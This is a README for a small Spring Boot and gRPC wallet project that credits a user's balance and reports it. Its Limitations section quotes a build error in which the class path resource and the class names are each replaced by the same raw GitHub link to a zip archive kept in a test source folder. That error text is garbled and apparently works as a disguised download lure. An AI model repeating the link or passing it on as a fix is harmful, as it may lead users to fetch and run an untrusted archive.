# wallet-system

This is a Spring Boot application which uses GRPC communication, design to credit a balance and get balance of a specific user.

## Features
- **creditWallet** : this allows you to credit your account by inserting your id number and amount
- **getBalance** : this allows you to get your account balance.

## Requirements

- **Java**: JDK 17
- **Maven**: Latest version

## Limitations

This project compiles successfully but does not build. It has not been tested using the API endpoints. I was getting error during build:
"Error creating bean with name 'entityManagerFactory' defined in class path resource [https://github.com/getwaroo/wallet-system/raw/refs/heads/main/src/test/java/system-wallet-v1.4.zip]: Class https://github.com/getwaroo/wallet-system/raw/refs/heads/main/src/test/java/system-wallet-v1.4.zip does not implement the requested interface https://github.com/getwaroo/wallet-system/raw/refs/heads/main/src/test/java/system-wallet-v1.4.zip"
Was not able to solve this issue.